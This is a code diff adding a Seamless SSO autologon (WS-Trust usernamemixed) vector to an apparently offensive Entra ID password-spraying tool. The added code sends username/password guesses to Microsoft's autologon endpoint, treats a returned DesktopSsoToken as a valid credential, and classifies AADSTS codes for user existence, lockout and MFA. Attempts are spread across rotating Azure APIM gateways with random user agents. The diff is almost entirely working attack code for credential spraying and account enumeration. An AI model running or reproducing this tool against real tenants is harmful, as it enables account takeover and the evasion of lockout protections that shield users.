@@ -12,12 +12,13 @@ import random
 import threading
 import json
 import re
+import html
 import requests
 import itertools
 import subprocess
 from pathlib import Path
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from datetime import datetime, timezone
+from datetime import datetime, timezone, timedelta
 from urllib.parse import urlparse
 
 # --- Configuration & Constants ---
@@ -78,6 +79,56 @@ DIRECT_MIN_DELAY = 1.0
 GETCREDTYPE_PATH = "common/GetCredentialType"
 IF_EXISTS_EXISTS = (0, 5, 6)
 IF_EXISTS_ABSENT = (1,)
+
+# --- Seamless SSO autologon vector (merged from optionalCTF/SSOh-No) ---
+# The Entra "Seamless SSO" autologon endpoint speaks WS-Trust. Posting a
+# UsernameToken (plaintext user+pass) to .../winauth/trust/2005/usernamemixed
+# both enumerates and validates: a success returns a <DesktopSsoToken>, while
+# failures come back as ordinary AADSTS codes (50034 user-not-found, 50126
+# bad-password, 50053 smart-lockout, 50076 MFA, ...). This backend sits on a
+# different host than login.microsoftonline.com, so APIM gateways fronting it
+# must be deployed with --task autologon (see apimspraycreate.py).
+AUTOLOGON_DIRECT_BASE_URL = "https://autologon.microsoftazuread-sso.com/"
+AUTOLOGON_PATH_TEMPLATE = "{domain}/winauth/trust/2005/usernamemixed"
+# Marker that signals valid credentials in a usernamemixed response body.
+DESKTOP_SSO_TOKEN_MARKER = "DesktopSsoToken"
+# Synthetic classification key (not a real AADSTS code) so an SSO-token success
+# flows through the same AADSTS_MAP/classification path as every other result.
+AUTOLOGON_SUCCESS_KEY = "DESKTOPSSO"
+
+# WS-Trust 1.3 RST envelope. Username/password are XML-escaped before insertion.
+AUTOLOGON_SOAP_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
+<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" xmlns:saml="urn:oasis:names:tc:SAML:1.0:assertion" xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:wssc="http://schemas.xmlsoap.org/ws/2005/02/sc" xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust">
+  <s:Header>
+    <wsa:Action s:mustUnderstand="1">http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action>
+    <wsa:To s:mustUnderstand="1">{to_url}</wsa:To>
+    <wsa:MessageID>urn:uuid:{message_id}</wsa:MessageID>
+    <wsa:ReplyTo>
+      <wsa:Address>http://www.w3.org/2005/08/addressing/anonymous</wsa:Address>
+    </wsa:ReplyTo>
+    <wsse:Security s:mustUnderstand="1">
+      <wsu:Timestamp wsu:Id="_0">
+        <wsu:Created>{created}</wsu:Created>
+        <wsu:Expires>{expires}</wsu:Expires>
+      </wsu:Timestamp>
+      <wsse:UsernameToken wsu:Id="uuid-{token_id}">
+        <wsse:Username>{username}</wsse:Username>
+        <wsse:Password>{password}</wsse:Password>
+      </wsse:UsernameToken>
+    </wsse:Security>
+  </s:Header>
+  <s:Body>
+    <wst:RequestSecurityToken Id="RST0">
+      <wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType>
+      <wsp:AppliesTo>
+        <wsa:EndpointReference>
+          <wsa:Address>urn:federation:MicrosoftOnline</wsa:Address>
+        </wsa:EndpointReference>
+      </wsp:AppliesTo>
+      <wst:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</wst:KeyType>
+    </wst:RequestSecurityToken>
+  </s:Body>
+</s:Envelope>"""
 
 # User Agents (Windows 11)
 USER_AGENTS = [
@@ -168,6 +219,8 @@ AADSTS_MAP = {
     "AADSTS500011": "VALID (Invalid Resource)",
     "AADSTS700016": "VALID (Invalid ClientID)",
     "AADSTS50000": "ERROR (Token Issue)",
+    # Seamless SSO autologon success (not a real AADSTS code; see AUTOLOGON_*).
+    "DESKTOPSSO": "VALID (SSO Token)",
 }
 
 # --- Classes ---
@@ -609,6 +662,71 @@ def perform_auth(target, gateway_url, tenant, app_config, proxy_dict=None):
     except requests.RequestException as e:
         return 0, str(e), None
 
+def derive_autologon_domain(username, fallback=None):
+    """
+    The usernamemixed path is scoped to the tenant's (federated) domain. Prefer
+    the domain portion of the UPN; fall back to an explicit --tenant/--domain.
+    """
+    if username and "@" in username:
+        dom = username.rsplit("@", 1)[1].strip()
+        if dom:
+            return dom
+    if fallback and fallback != "common":
+        return fallback
+    return None
+
+def perform_auth_autologon(target, gateway_url, tenant=None):
+    """
+    Single Seamless-SSO autologon (WS-Trust usernamemixed) attempt.
+
+    Returns (status_code, response_text, aadsts) matching perform_auth's contract
+    so the shared classification/lockout/logging path in process_attempt applies
+    unchanged. A valid credential yields aadsts=AUTOLOGON_SUCCESS_KEY; every other
+    outcome is reported via its real AADSTS code.
+    """
+    domain = derive_autologon_domain(target.username, tenant)
+    if not domain:
+        # Without a domain we cannot build the path; surface as a request error.
+        return 0, "autologon: could not derive tenant domain from username", None
+
+    if not gateway_url.endswith("/"):
+        gateway_url += "/"
+
+    request_id = str(uuid.uuid4())
+    path = AUTOLOGON_PATH_TEMPLATE.format(domain=domain)
+    full_url = f"{gateway_url}{path}?client-request-id={request_id}"
+
+    now = datetime.now(timezone.utc)
+    created = now.strftime("%Y-%m-%dT%H:%M:%S.000Z")
+    expires = (now + timedelta(minutes=10)).strftime("%Y-%m-%dT%H:%M:%S.000Z")
+
+    body = AUTOLOGON_SOAP_TEMPLATE.format(
+        to_url=html.escape(full_url),
+        message_id=uuid.uuid4(),
+        created=created,
+        expires=expires,
+        token_id=uuid.uuid4(),
+        username=html.escape(target.username or ""),
+        password=html.escape(target.password or ""),
+    )
+
+    headers = {
+        "User-Agent": random.choice(USER_AGENTS),
+        "Content-Type": "application/soap+xml; charset=utf-8",
+        "SOAPAction": "http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue",
+        "client-request-id": request_id,
+        "return-client-request-id": "true",
+    }
+
+    try:
+        resp = requests.post(full_url, headers=headers, data=body.encode("utf-8"), timeout=15, verify=True)
+    except requests.RequestException as e:
+        return 0, str(e), None
+
+    if DESKTOP_SSO_TOKEN_MARKER in resp.text:
+        return resp.status_code, resp.text, AUTOLOGON_SUCCESS_KEY
+    return resp.status_code, resp.text, parse_aadsts(resp.text)
+
 def check_user_exists(username, gateway_url):
     """
     Enumerates a single user via GetCredentialType through APIM.
@@ -715,6 +833,7 @@ def process_attempt(
     continue_on_success,
     stop_event,
     notifier=None,
+    method="oauth",
 ):
     """
     Worker function to process a single login attempt.
@@ -722,6 +841,12 @@ def process_attempt(
     """
     if stop_event.is_set():
         return
+
+    # Auth vector: ROPC token endpoint (default) or Seamless-SSO autologon.
+    def _auth(gw):
+        if method == "autologon":
+            return perform_auth_autologon(target, gw, tenant)
+        return perform_auth(target, gw, tenant, app_config)
     
     # Check if user is globally locked or invalid
     with lock:
@@ -746,7 +871,7 @@ def process_attempt(
     gateway_url = apim_manager.get_next_url()
 
     # Attempt
-    status_code, response_text, aadsts = perform_auth(target, gateway_url, tenant, app_config)
+    status_code, response_text, aadsts = _auth(gateway_url)
 
     # Handle User Not Found (50034)
     if aadsts == USER_NOT_FOUND_ERROR:
@@ -800,7 +925,7 @@ def process_attempt(
 
             # Retry with the primary gateway
             gateway_url = apim_manager.get_next_url()
-            status_code, response_text, aadsts = perform_auth(target, gateway_url, tenant, app_config)
+            status_code, response_text, aadsts = _auth(gateway_url)
 
             if aadsts == SMART_LOCKOUT_ERROR:
                 with lock:
@@ -882,6 +1007,21 @@ def main():
             "or proxy. Ignores --urls and never deploys Azure resources. Every "
             "attempt egresses from this host's IP, so use conservative pacing. "
             "Intended for on-site assessments from the client's own network."
+        ),
+    )
+    parser.add_argument(
+        "--method",
+        choices=["oauth", "autologon"],
+        default="oauth",
+        help=(
+            "Credential-test vector for spray/validate/validate-clients:\n"
+            "  oauth     - ROPC password grant against the /oauth2/token endpoint (default).\n"
+            "  autologon - Seamless-SSO WS-Trust usernamemixed endpoint (merged from\n"
+            "              SSOh-No). A hit returns a DesktopSsoToken; misses come back as\n"
+            "              AADSTS codes. Lives on autologon.microsoftazuread-sso.com, so\n"
+            "              APIM gateways for it must be built with apimspraycreate.py\n"
+            "              --task autologon (use --urls urls_autologon.txt). Ignored by\n"
+            "              validate-users, which always uses GetCredentialType."
         ),
     )
     parser.add_argument("--users", help="Path to users file, or a single username inline (file wins if it exists)")
@@ -1004,12 +1144,21 @@ def main():
 
     args = parser.parse_args()
 
+    # The autologon vector carries no client-app dimension (the WS-Trust request
+    # has no client_id), so validate-clients is meaningless there.
+    if args.method == "autologon" and args.mode == "validate-clients":
+        print_error("--method autologon is incompatible with validate-clients (autologon sends no client_id).")
+        sys.exit(1)
+    if args.method == "autologon" and args.mode == "validate-users":
+        print_warn("validate-users always uses GetCredentialType; --method autologon is ignored for it.")
+
     # Direct mode: skip the APIM URL pool entirely and target Microsoft directly.
     if args.direct:
         if args.urls:
             print_warn("--direct is set; ignoring --urls and connecting straight to Microsoft.")
-        urls = [DIRECT_BASE_URL]
-        print_info(f"Direct mode: targeting {DIRECT_BASE_URL} from this host (no gateway/proxy).")
+        direct_base = AUTOLOGON_DIRECT_BASE_URL if args.method == "autologon" else DIRECT_BASE_URL
+        urls = [direct_base]
+        print_info(f"Direct mode: targeting {direct_base} from this host (no gateway/proxy).")
         apim_manager = APIMManager(urls)
     else:
         urls = None
@@ -1021,16 +1170,23 @@ def main():
             try:
                 choice = input("Would you like to deploy new APIM resources now? [y/N]: ").strip().lower()
                 if choice in ('y', 'yes'):
-                    # validate-users needs gateways exposing the GetCredentialType
-                    # operation, kept in a separate list from the spray gateways.
+                    # Each vector needs gateways exposing its own operation/backend,
+                    # kept in separate URL lists: GetCredentialType (validate-users),
+                    # the autologon WS-Trust endpoint (--method autologon), or the
+                    # ROPC token endpoint (everything else).
                     is_enum = args.mode == "validate-users"
-                    outfile = "urls_enum.txt" if is_enum else "urls.txt"
+                    is_autologon = args.method == "autologon" and not is_enum
+                    if is_autologon:
+                        outfile, create_task = "urls_autologon.txt", "autologon"
+                    elif is_enum:
+                        outfile, create_task = "urls_enum.txt", "enum"
+                    else:
+                        outfile, create_task = "urls.txt", "spray"
                     # Resolve the deployer next to this script so it works when
                     # apimspray is invoked from any working directory.
                     creator = str(Path(__file__).resolve().parent / "apimspraycreate.py")
                     create_cmd = [sys.executable, creator, "--count", "33", "--outfile", outfile]
-                    if is_enum:
-                        create_cmd += ["--task", "enum"]
+                    create_cmd += ["--task", create_task]
                     print_info("Launching apimspraycreate.py...")
                     try:
                         subprocess.run(create_cmd, check=True)
@@ -1130,6 +1286,9 @@ def main():
     
     print_info(f"Starting apimspray")
     print_info(f"Mode: {style(args.mode, TermColors.MAGENTA, TermColors.BOLD)}")
+    if args.mode != "validate-users":
+        vector = "Seamless SSO autologon (WS-Trust)" if args.method == "autologon" else "ROPC /oauth2/token"
+        print_info(f"Vector: {style(vector, TermColors.MAGENTA, TermColors.BOLD)}")
     if args.mode == "spray":
         print_info(f"Users: {style(str(len(users)), TermColors.MAGENTA, TermColors.BOLD)}")
         print_info(f"Passwords: {style(str(len(passwords)), TermColors.MAGENTA, TermColors.BOLD)}")
@@ -1190,6 +1349,7 @@ def main():
     manifest = {
         "started": utc_now_str(),
         "mode": args.mode,
+        "method": args.method,
         "tenant": args.tenant,
         "domain": args.domain,
         "pace": args.pace,
@@ -1235,6 +1395,7 @@ def main():
                     args.continue_on_success,
                     stop_event,
                     notifier,
+                    args.method,
                 )
                 futures.append(future)
                 
